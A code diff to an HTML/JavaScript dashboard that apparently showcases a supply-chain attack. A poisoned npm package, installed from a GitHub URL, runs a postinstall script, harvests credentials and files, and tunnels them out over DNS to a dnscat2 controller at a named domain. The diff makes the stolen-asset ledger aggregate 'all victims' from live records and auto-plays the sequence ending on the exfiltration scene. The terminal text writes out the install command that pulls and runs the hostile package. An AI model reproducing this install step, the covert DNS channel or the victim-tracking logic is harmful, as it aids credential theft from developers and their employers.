@@ -75,6 +75,11 @@
     .title-area h1 { font-size: 1.1rem; letter-spacing: 0.5px; font-weight: 700; }
     .controls { display: flex; gap: 8px; }
 
+    /* Recorded showcase: one self-running sequence. No tab bar, no transport
+       controls — the sequence auto-starts on load and holds on the exfil scene.
+       Elements stay in the DOM (JS writes btnPlay.textContent) but are hidden. */
+    .view-tabs, #btnPlay, #btnStep, #btnReset { display: none !important; }
+
     .view-tabs {
       display: flex; gap: 6px; background: #1a2236; padding: 4px;
       border-radius: 8px; border: 1px solid #2a3550;
@@ -327,6 +332,20 @@
       background: rgba(134, 239, 172, 0.12); border: 1px solid rgba(134, 239, 172, 0.4);
       color: var(--accent-green);
     }
+    .posture-host {
+      display: flex; gap: 10px; align-items: baseline; font-size: 0.72rem;
+      padding: 7px 0; border-bottom: 1px dashed rgba(139, 148, 176, 0.25);
+    }
+    .posture-host:last-of-type { border-bottom: none; }
+    .posture-host b { font-family: ui-monospace, Menlo, Consolas, monospace; color: var(--text); font-weight: 700; }
+    .posture-host span { font-weight: 800; letter-spacing: 0.03em; }
+    .posture-host.ok span { color: var(--accent-green); }
+    .posture-host.bad span { color: var(--accent-red); }
+    .posture-host.warn span { color: var(--accent-yellow); }
+    .posture-host.na span { color: var(--text-muted); font-style: italic; font-weight: 600; }
+    .posture-host i { margin-left: auto; font-style: normal; color: var(--text-muted);
+      font-family: ui-monospace, Menlo, Consolas, monospace; font-size: 0.66rem;
+      white-space: nowrap; overflow: hidden; text-overflow: ellipsis; max-width: 55%; }
 
     .cve-row {
       display: flex; gap: 8px; align-items: center; padding: 5px 7px;
@@ -458,16 +477,16 @@
 
       <g transform="translate(1010, 120)">
         <rect width="130" height="75" rx="6" fill="#1a2236" stroke="#7c5cff" stroke-width="1.5"/>
-        <text x="65" y="22" text-anchor="middle" fill="#ffffff" font-size="10" font-weight="bold">DevOps Linux</text>
-        <text x="65" y="38" text-anchor="middle" fill="#60a5fa" font-size="9">10.10.100.100</text>
+        <text x="65" y="22" text-anchor="middle" fill="#ffffff" font-size="10" font-weight="bold">Software Developer</text>
+        <text x="65" y="38" text-anchor="middle" fill="#60a5fa" font-size="9">10.10.100.201</text>
         <text x="65" y="54" text-anchor="middle" fill="#9ca3af" font-size="8">Least-Privilege User</text>
-        <text x="65" y="67" text-anchor="middle" fill="#86efac" font-size="8" id="nodeClientRole">Role: Dev Environment</text>
+        <text x="65" y="67" text-anchor="middle" fill="#86efac" font-size="8" id="nodeClientRole">Role: Software Developer</text>
       </g>
 
       <g transform="translate(1010, 240)">
         <rect width="130" height="70" rx="6" fill="#1a2236" stroke="#2a3550"/>
         <text x="65" y="24" text-anchor="middle" fill="#9ca3af" font-size="10">Corporate Windows</text>
-        <text x="65" y="42" text-anchor="middle" fill="#6b7280" font-size="9">10.10.100.200</text>
+        <text x="65" y="42" text-anchor="middle" fill="#6b7280" font-size="9">10.10.100.202</text>
         <text x="65" y="58" text-anchor="middle" fill="#4b5563" font-size="8">Standard Desktop</text>
       </g>
 
@@ -545,7 +564,7 @@
   <div class="loot-grid">
     <div class="panel">
       <div class="panel-header">
-        <span>EXFILTRATED ASSET LEDGER — BREACH IMPACT</span>
+        <span>EXFILTRATED ASSET LEDGER — BREACH IMPACT (ALL VICTIMS)</span>
         <span style="color:var(--accent-red);" id="ledgerStatus">LIVE</span>
       </div>
       <div class="panel-body" id="ledgerBody"><div class="pending">loading live record…</div></div>
@@ -553,7 +572,7 @@
 
     <div class="panel">
       <div class="panel-header">
-        <span>TARGET POSTURE — LEAST PRIVILEGE</span>
+        <span>TARGET POSTURE — LEAST PRIVILEGE (PER HOST)</span>
         <span style="color:var(--accent-green);" id="postureStatus">VERIFYING</span>
       </div>
       <div class="panel-body" id="postureBody"><div class="pending">loading live record…</div></div>
@@ -561,7 +580,7 @@
 
     <div class="panel">
       <div class="panel-header">
-        <span>ZERO-DAY CHAIN — CVE GATE ASSESSMENT</span>
+        <span>ZERO-DAY CHAIN — CVE GATES (PER HOST)</span>
         <span style="color:var(--accent-yellow);" id="cveStatus">RECON ONLY</span>
       </div>
       <div class="panel-body" id="cveBody"><div class="pending">loading live record…</div></div>
@@ -575,7 +594,7 @@
       <span style="color:var(--accent-green);" id="chainStatus">3 RELAYS ACTIVE · ROTATES PER SESSION</span>
     </div>
     <div class="chain-track">
-      <div class="chain-node"><b>DevOps host</b><i>10.10.100.100 (least-priv)</i></div>
+      <div class="chain-node"><b>Software Developer</b><i>10.10.100.201 (least-priv)</i></div>
       <div class="chain-link"><span class="chain-dot"></span></div>
       <div class="chain-node hop"><b>relay-1 · dns1</b><i>UDP/53 · VPS A</i></div>
       <div class="chain-link"><span class="chain-dot"></span></div>
@@ -591,10 +610,10 @@
   <div class="bottom-grid">
     <div class="panel">
       <div class="panel-header">
-        <span>LIVE HOST AUDIT &amp; PROCESS LOG (10.10.100.100)</span>
+        <span>LIVE HOST AUDIT &amp; PROCESS LOG (10.10.100.201)</span>
         <span style="color:var(--accent-green);" id="termStatus">READY</span>
       </div>
-      <div class="terminal-body" id="termLog">Select a scenario above to view packet tracing and DPI validation logs...</div>
+      <div class="terminal-body" id="termLog">packet tracing and DPI validation logs stream here…</div>
     </div>
 
     <div class="panel">
@@ -613,12 +632,15 @@
     const FALLBACK = {
       target: 'debian-builder', user: 'arjun.das', ts: '—',
       credsTotal: 26, sensEnv: 23, envTotal: 53, fileCount: 5, datasetCount: 2,
-      bytes: 7848, posture: null, primitives: null, files: [], datasets: [], creds: []
+      bytes: 7848, posture: null, primitives: null, files: [], datasets: [], creds: [],
+      victims: 1, hosts: []
     };
     let LIVE = null;
+    let ALL = null;
     let lastBytesShown = 0;
 
     function d() { return LIVE || FALLBACK; }
+    function agg() { return ALL || FALLBACK; }
 
     function fmtBytes(n) {
       if (n >= 1048576) return (n / 1048576).toFixed(1) + ' MB';
@@ -647,6 +669,31 @@
           posture: r.posture || null, primitives: r.primitives || null,
           files: r.files || [], datasets: r.datasets || [], creds: r.creds || [],
           records: recs.length
+        };
+        // aggregate across ALL victims (distinct target+user, latest record each)
+        const byHost = {};
+        for (const x of recs) byHost[(x.target || '?') + '\u0000' + (x.user || '?')] = x;
+        const hostRecs = Object.values(byHost);
+        const uni = { files: [], datasets: [], creds: [] };
+        let cT = 0, eT = 0, fC = 0, dC = 0;
+        for (const x of hostRecs) {
+          cT += (x.creds || []).length;
+          eT += (x.env || []).length;
+          fC += (x.files || []).length;
+          dC += (x.datasets || []).length;
+          uni.files.push(...(x.files || []));
+          uni.datasets.push(...(x.datasets || []));
+          uni.creds.push(...(x.creds || []));
+        }
+        ALL = {
+          victims: hostRecs.length,
+          credsTotal: cT, envTotal: eT, fileCount: fC, datasetCount: dC,
+          bytes: LIVE.bytes,
+          files: uni.files, datasets: uni.datasets, creds: uni.creds,
+          hosts: hostRecs.map(x => ({
+            target: x.target || '?', user: x.user || '?',
+            posture: x.posture || null, primitives: x.primitives || null
+          }))
         };
         renderLedger(); renderPosture(); renderCves(); updateBanner(false);
         if (!isPlaying && currentStep === 0) switchDiagram(currentDiagram);
@@ -700,7 +747,7 @@
     ];
 
     function observedEvidence(row) {
-      const dd = d();
+      const dd = agg();
       const hay = []
         .concat(dd.files.map(f => String(f.path || '')))
         .concat(dd.datasets.map(x => String(x.name || '') + ' ' + String(x.agency || '')))
@@ -709,10 +756,11 @@
     }
 
     function renderLedger() {
-      const dd = d();
+      const dd = agg();
       const el = document.getElementById('ledgerBody');
       const hero =
         '<div class="hero-stats">' +
+        `<div class="stat-chip hot"><b>${dd.victims}</b><span>victims</span></div>` +
         `<div class="stat-chip hot"><b>${dd.credsTotal}</b><span>credentials</span></div>` +
         `<div class="stat-chip"><b>${dd.envTotal}</b><span>env vars</span></div>` +
         `<div class="stat-chip hot"><b>${dd.fileCount}</b><span>corporate files</span></div>` +
@@ -733,83 +781,103 @@
           '</div>';
       }
       el.innerHTML = hero + rows +
-        '<div class="cve-facts">Channel = same covert DNS path that carried this run\'s live record. ' +
+        '<div class="cve-facts">Counts aggregate across all victims observed over the same covert DNS channel. ' +
         'Fines per PDPA 2020 / sector regulators; competitor rows show how the same data reshapes markets.</div>';
     }
 
-    // ---------------- posture panel ----------------
-    function renderPosture() {
-      const p = (d().posture) || null;
-      const el = document.getElementById('postureBody');
-      const status = document.getElementById('postureStatus');
-      if (!p) { el.innerHTML = '<div class="pending">awaiting live record (run npm install on target)…</div>'; status.textContent = 'PENDING'; return; }
-      const chips = [];
-      let passed = 0, total = 0;
-      const chip = (state, title, detail) => {
+    // ---------------- posture panel (per-host verdicts, aggregate strip) ----------------
+    function postureSummary(p) {
+      if (!p || !Object.keys(p).length) return null;
+      const def = v => v !== undefined && v !== null;
+      let passed = 0, total = 0, failed = 0;
+      const chip = (state) => {           // true | false | null (n/a)
+        if (state === null) return;
         total++;
         if (state === true) passed++;
-        const cls = state === true ? 'ok' : (state === false ? 'bad' : 'na');
-        chips.push(`<div class="check-chip ${cls}"><b>${title}</b><i>${detail}</i></div>`);
+        else failed++;
       };
-      chip(p.uid !== null && p.uid !== undefined && p.uid !== 0,
-        `uid=${p.uid} user=${p.user || '?'}`, p.uid === 0 ? 'running as ROOT' : 'non-root identity');
-      chip(p.sudoPasswordless === false, 'sudo -n: DENIED', 'no passwordless privilege path');
-      chip(p.apparmorProfile && /enforce/i.test(p.apparmorProfile) && !p.unconfined,
-        `AppArmor: ${p.apparmorProfile || 'n/a'}`, 'MAC confinement active on process');
-      chip(Array.isArray(p.capabilities) && p.capabilities.length === 0,
-        `CapEff: ${p.capabilities ? (p.capabilities.length ? p.capabilities.join(',') : '0x0 (none)') : 'n/a'}`,
-        'kernel capability set empty');
+      chip(def(p.uid) ? p.uid !== 0 : null);
+      chip(def(p.sudoPasswordless) ? p.sudoPasswordless === false : null);
+      chip(def(p.apparmorProfile) ? /enforce/i.test(p.apparmorProfile) && !p.unconfined : null);
+      chip(def(p.capabilities) ? Array.isArray(p.capabilities) && p.capabilities.length === 0 : null);
       const wp = p.writeProbe || {};
-      for (const dir of Object.keys(wp)) {
-        chip(wp[dir] !== 'WRITABLE (unexpected)', `write ${dir}: ${wp[dir]}`, 'system path read-only for target');
-      }
-      chip(p.homeList === 'denied', `home listing: ${p.homeList || 'n/a'}`, 'AppArmor path restriction');
-      chip(p.dockerSock && p.dockerSock.indexOf('absent') === 0, `docker.sock: ${p.dockerSock || 'n/a'}`, 'no container-admin bridge');
+      for (const dir of Object.keys(wp)) chip(wp[dir] !== 'WRITABLE (unexpected)');
+      chip(def(p.homeList) ? p.homeList === 'denied' : null);
+      chip(def(p.dockerSock) ? String(p.dockerSock).indexOf('absent') === 0 : null);
       const v = p.vault;
-      if (v) {
-        const scoped = v.granted < v.configured;
-        chip(scoped, `vault scope: ${v.granted}/${v.configured} paths`, `token ${v.tokenFound ? 'found via ' + (v.tokenSource || 'file') : 'absent'} — policy narrow by design`);
-      } else {
-        chip(null, 'vault scope: n/a', 'harvest phase skipped or no token');
-      }
-      if (p.noNewPrivs !== null && p.noNewPrivs !== undefined) {
-        chip(p.noNewPrivs === true, `NoNewPrivs: ${p.noNewPrivs}`, 'exec gain-of-privilege blocked');
-      }
-      const verdict = passed === total
-        ? `LEAST-PRIVILEGE VERIFIED — ${passed}/${total} checks held`
-        : `POSTURE ${total - passed} CHECK(S) FAILED — ${passed}/${total} held`;
-      el.innerHTML = `<div class="check-grid">${chips.join('')}</div>` +
-        `<div class="posture-verdict" style="${passed === total ? '' : 'background:rgba(244,63,94,.12);border-color:rgba(244,63,94,.5);color:var(--accent-red)'}">${verdict}</div>`;
-      status.textContent = `${passed}/${total} HELD`;
-      status.style.color = passed === total ? 'var(--accent-green)' : 'var(--accent-red)';
+      if (v) chip(v.granted < v.configured);
+      if (def(p.noNewPrivs)) chip(p.noNewPrivs === true);
+      return { passed, total, failed };
     }
 
-    // ---------------- zero-day CVE gates ----------------
+    function renderPosture() {
+      const el = document.getElementById('postureBody');
+      const status = document.getElementById('postureStatus');
+      const hosts = agg().hosts || [];
+      if (!hosts.length) {
+        el.innerHTML = '<div class="pending">awaiting live record (run npm install on target)…</div>';
+        status.textContent = 'PENDING'; status.style.color = 'var(--accent-yellow)';
+        return;
+      }
+      let held = 0, evaluated = 0;
+      const rows = [];
+      for (const h of hosts) {
+        const s = postureSummary(h.posture);
+        if (!s || !s.total) {
+          rows.push(`<div class="posture-host na"><b>${h.target}</b><span>posture not evaluated</span><i>${h.user}</i></div>`);
+          continue;
+        }
+        evaluated++;
+        const ok = s.failed === 0;
+        if (ok) held++;
+        rows.push(`<div class="posture-host ${ok ? 'ok' : 'bad'}"><b>${h.target}</b>` +
+          `<span>${ok ? 'LEAST-PRIV VERIFIED' : 'POSTURE ' + s.failed + ' CHECK(S) FAILED'}</span>` +
+          `<i>${s.passed}/${s.total} held · ${h.user}</i></div>`);
+      }
+      el.innerHTML = rows.join('') +
+        '<div class="cve-facts">Verdict computed per host at intake — full check detail lives in the victim register drill-down.</div>';
+      if (!evaluated) {
+        status.textContent = 'NO DATA'; status.style.color = 'var(--accent-yellow)';
+      } else {
+        const allOk = held === evaluated;
+        status.textContent = `${held}/${evaluated} HOSTS`;
+        status.style.color = allOk ? 'var(--accent-green)' : 'var(--accent-red)';
+      }
+    }
+
+    // ---------------- zero-day CVE gates (per-host compact strip) ----------------
     function renderCves() {
-      const pr = (d().primitives) || null;
       const el = document.getElementById('cveBody');
       const status = document.getElementById('cveStatus');
-      if (!pr || !pr.primitives) { el.innerHTML = '<div class="pending">awaiting live record…</div>'; status.textContent = 'PENDING'; return; }
-      let rows = '';
-      for (const c of pr.primitives) {
-        rows +=
-          `<div class="cve-row">` +
-          `<span class="cve-id">${c.cve}</span>` +
-          `<span class="cve-name">${c.name}</span>` +
-          `<span class="gate ${c.ready ? 'open' : 'closed'}">${c.ready ? 'GATE OPEN' : 'GATE CLOSED'}</span>` +
-          `<span class="exploit">EXPLOIT: NONE</span>` +
-          `</div>`;
+      const hosts = agg().hosts || [];
+      if (!hosts.length) {
+        el.innerHTML = '<div class="pending">awaiting live record…</div>';
+        status.textContent = 'PENDING'; status.style.color = 'var(--accent-yellow)';
+        return;
       }
-      const f = pr.facts || {};
-      const facts = `facts: kernel=${f.kernel || '?'} userns_clone=${f.usernsClone ?? '?'} apparmor_userns_restrict=${f.apparmorUsernsRestrict ?? '?'}` +
-        ` algif=${f.algifLoaded ?? f.algifModule ?? '?'} act_pedit=${f.peditLoaded ?? f.peditModule ?? '?'} docker=${f.dockerSock ?? '?'}`;
-      const openCount = pr.primitives.filter(c => c.ready).length;
-      el.innerHTML = rows +
-        `<div class="cve-facts">${facts}</div>` +
-        `<div class="cve-thesis"><strong>${openCount} gate(s) open, 0 exploits fired.</strong> ` +
+      let openTotal = 0, gateTotal = 0;
+      const rows = [];
+      for (const h of hosts) {
+        const pr = h.primitives;
+        if (!pr || !pr.primitives || !pr.primitives.length) {
+          rows.push(`<div class="posture-host na"><b>${h.target}</b><span>no gate data</span><i>${h.user}</i></div>`);
+          continue;
+        }
+        const open = pr.primitives.filter(c => c.ready);
+        openTotal += open.length;
+        gateTotal += pr.primitives.length;
+        const ids = open.map(c => c.cve).join(' ') || '—';
+        rows.push(`<div class="posture-host ${open.length ? 'warn' : 'ok'}"><b>${h.target}</b>` +
+          `<span>${open.length}/${pr.primitives.length} GATES OPEN</span>` +
+          `<i>${ids} · 0 fired</i></div>`);
+      }
+      el.innerHTML = rows.join('') +
+        `<div class="cve-thesis"><strong>${openTotal} gate(s) open, 0 exploits fired.</strong> ` +
         `The breach above needed no kernel LPE: the supply-chain package already ran as the unprivileged user. ` +
-        `A zero-day that DID clear these gates converts "read-only leak" into full host takeover — that is the step-change investors should price in.</div>`;
-      status.textContent = `${openCount} OPEN / ${pr.primitives.length} — 0 FIRED`;
+        `A zero-day that DID clear these gates converts "read-only leak" into full host takeover — that is the step-change investors should price in. ` +
+        `Gate detail per host lives in the victim register drill-down.</div>`;
+      status.textContent = `${openTotal} OPEN / ${gateTotal} — 0 FIRED`;
+      status.style.color = openTotal ? 'var(--accent-yellow)' : 'var(--accent-green)';
     }
 
     // ---------------- banner ----------------
@@ -818,7 +886,7 @@
       const t0 = performance.now();
       const dur = 1100;
       function tick(t) {
-        const k = Math.min(1, (t - t0) / dur);
+        const k = Math.max(0, Math.min(1, (t - t0) / dur));
         const v = Math.round(from + (to - from) * (1 - Math.pow(1 - k, 3)));
         el.textContent = suffix.replace('%v', fmtBytes(v));
         if (k < 1) requestAnimationFrame(tick); else lastBytesShown = to;
@@ -1068,7 +1136,7 @@
       }
 
       if (num === 1) {
-        document.getElementById('nodeClientRole').textContent = 'Role: Regular DevOps';
+        document.getElementById('nodeClientRole').textContent = 'Role: Regular Software Developer';
         document.getElementById('target1Name').textContent = 'registry.npmjs.org';
         document.getElementById('target1IP').textContent = '104.16.25.35 (HTTPS/443)';
         document.getElementById('target1Desc').textContent = 'Official Node Package Registry';
@@ -1088,7 +1156,7 @@
         renderDiagram2(0);
       }
       else if (num === 3) {
-        document.getElementById('nodeClientRole').textContent = 'Role: Compromised Tunnel Endpoint';
+        document.getElementById('nodeClientRole').textContent = 'Role: Compromised Host';
         document.getElementById('target1Name').textContent = 'dns.apexadversary.com';
         document.getElementById('target1IP').textContent = '34.180.91.216 (DNS C2)';
         document.getElementById('target1Desc').textContent = 'dnscat2 Active Controller';
@@ -1119,14 +1187,14 @@
       placePacket(step);
 
       if (step === 0) {
-        term.textContent = `devops@10.10.100.100:~$ git clone https://github.com/organization/production-app.git\n` +
+        term.textContent = `dev@10.10.100.201:~$ git clone https://github.com/organization/production-app.git\n` +
           `[+] SCENE 1: regular internet traffic — HTTPS/443 sessions Trusted VPC → public services\n` +
           `[+] checkpoint: Tier 1 Palo Alto → Tier 2 FortiGate (DPI examines packet CONTENTS in real time)\n` +
           `[+] rule set by network admin: forbidden content → deny + block; clean content → forward\n` +
           `[+] least-privilege developer user active (uid non-root, sudo denied) · 0 B to adversary zones`;
         analysis.innerHTML = `<strong>Scene 1 — Regular Internet Traffic through the Checkpoint:</strong><br>` +
-          `Normal DevOps sessions to <code>registry.npmjs.org</code> / <code>github.com</code> flow across the topology — ` +
-          `DevOps &amp; Corporate hosts → Palo Alto → FortiGate → IGW → Internet. At each checkpoint DPI makes real-time verdicts on packet contents ` +
+          `Normal Developer sessions to <code>registry.npmjs.org</code> / <code>github.com</code> flow across the topology — ` +
+          `Developer &amp; Corporate hosts → Palo Alto → FortiGate → IGW → Internet. At each checkpoint DPI makes real-time verdicts on packet contents ` +
           `using admin-assigned rules. <em>Header-only filtering reads the address printed on an envelope; DPI opens the envelope</em> — ` +
           `it inspects payload and can identify the originating service/application. Two independent engines (Tier 1 App-ID/URL/WildFire, ` +
           `Tier 2 SSL-decrypt/IPS/AV) must both pass before SNAT — the double-DPI standard, <strong>0 B egressed to adversary zones</strong>.`;
@@ -1147,7 +1215,7 @@
           `   - Action: FORWARD to eth1/1 (10.10.10.3)`;
         analysis.innerHTML = `<strong>Pass 1 of 2 — Palo Alto (SP3 engine):</strong><br>` +
           `PAN-OS evaluates App-ID (<code>ssl</code>/<code>git</code>), PAN-DB URL category, antivirus, file-blocking and WildFire sandboxing in one pass. ` +
-          `Legitimate DevOps traffic sails through: <strong>policy working as designed</strong>. Traffic is handed to the transit subnet <code>10.10.10.0/24</code> for the second opinion.`;
+          `Legitimate Developer traffic sails through: <strong>policy working as designed</strong>. Traffic is handed to the transit subnet <code>10.10.10.0/24</code> for the second opinion.`;
       }
       else if (step === 2) {
         document.getElementById('fg-ssl').className = 'profile-card inspecting';
@@ -1176,10 +1244,10 @@
       else if (step === 5) {
         term.textContent += `\n\n[SUCCESS] Clone complete. Developer receives official repository packages.\n` +
           `Everything complies with enterprise compliance posture. 0 bytes egressed to adversary zones.\n` +
-          `[HINT] Now run the SAME flow with a poisoned dependency — Tab: Diagram 2.`;
+          `[HINT] Next: the SAME flow, this time with a poisoned dependency in the build.`;
         analysis.innerHTML = `<strong>Why this baseline matters:</strong><br>` +
           `The architecture is correct, compliant, and expensive. Its entire threat model assumes <em>payload</em> attacks — malware, exploits, known-bad files. ` +
-          `It has no answer for <strong>where the bytes are</strong> when a build step itself becomes the attacker. Advance to Diagram 2 for the pivot.`;
+          `It has no answer for <strong>where the bytes are</strong> when a build step itself becomes the attacker. The pivot follows — same topology, poisoned dependency.`;
         if (!isPlaying) {
           stopPlay();
           autoAdvanceT = setTimeout(() => {
@@ -1198,7 +1266,7 @@
       const dd = d();
 
       if (step === 0) {
-        term.textContent = `devops@10.10.100.100:~$ NODE_EXTRA_CA_CERTS=$HOME/corp-ca.pem \\\n` +
+        term.textContent = `dev@10.10.100.201:~$ NODE_EXTRA_CA_CERTS=$HOME/corp-ca.pem \\\n` +
           `    npm install git+https://github.com/46y9qkpkjc-ui/ai-model-observability.git\n` +
           `[>] postinstall: node stage.js   (ZERO manual commands — pure supply chain)\n` +
           `[!] PIVOT: this is where the double-DPI standard stops mattering.\n` +
@@ -1229,7 +1297,7 @@
         analysis.innerHTML = `<strong>The Exfiltration Problem (for the attacker):</strong><br>` +
           `Unknown-destination HTTPS is exactly what both firewalls are best at stopping. ` +
           `So the package does not fight the DPI stack — it <strong>leaves the HTTP universe entirely</strong> and encapsulates everything into DNS queries, ` +
-          `the one protocol both tiers treat as infrastructure rather than content. Advance to Diagram 3.`;
+          `the one protocol both tiers treat as infrastructure rather than content. The final stage follows — the covert channel carrying the data out.`;
         if (!isPlaying) {
           stopPlay();
           autoAdvanceT = setTimeout(() => {
@@ -1310,7 +1378,7 @@
           `Measured result: channel round-trips ~90ms, exfil POSTs of ${fmtBytes(dd.bytes)} delivered.`;
       }
       else if (step === 3 || step === 4) {
-        term.textContent += `\n>> [Egress NAT] FortiGate port1 translates 10.10.100.100 → 34.124.160.193\n` +
+        term.textContent += `\n>> [Egress NAT] FortiGate port1 translates 10.10.100.201 → 34.124.160.193\n` +
           `>> Covert stream egresses the Internet Gateway`;
         analysis.innerHTML = `<strong>Covert Perimeter Egress:</strong><br>` +
           `Same SNAT, same route, same green dashboards as Diagram 1 — except the payload is now the loot. ` +
@@ -1328,12 +1396,7 @@
           `The ZERO-DAY panel shows the four 2026 kernel primitives were only <em>assessed</em>, never fired: the supply-chain payload made escalation unnecessary. ` +
           `Right-hand reading for the board: <strong>FINE EXPOSURE</strong> (PDPA/sector regulators) and <strong>COMPETITOR DISADVANTAGE</strong> from the ledger — ` +
           `for an attacker, breaching the process is cheaper than breaching the kernel.`;
-        if (!isPlaying) {
-          stopPlay();
-          autoAdvanceT = setTimeout(() => {
-            if (currentDiagram === 3 && currentStep === 5 && !isPlaying) switchDiagram(1);
-          }, 8000);
-        }
+        // terminal scene — hold here; advanceDiagramWhilePlaying() stops playback.
       }
       term.scrollTop = term.scrollHeight;
     }
@@ -1354,7 +1417,7 @@
     function advanceDiagramWhilePlaying() {
       if (currentDiagram === 1) switchDiagram(2, true);
       else if (currentDiagram === 2) switchDiagram(3, true);
-      else switchDiagram(1, true);
+      else stopPlay();   // hold on the exfil money shot — no loop back to diagram 1
     }
 
     function playTick() {
@@ -1397,6 +1460,7 @@
       switchDiagram(1);
       refreshLive();
       setInterval(refreshLive, 15000);
+      togglePlay();   // self-running showcase: baseline -> pivot -> exfil, then hold
     };
   </script>
 </body>
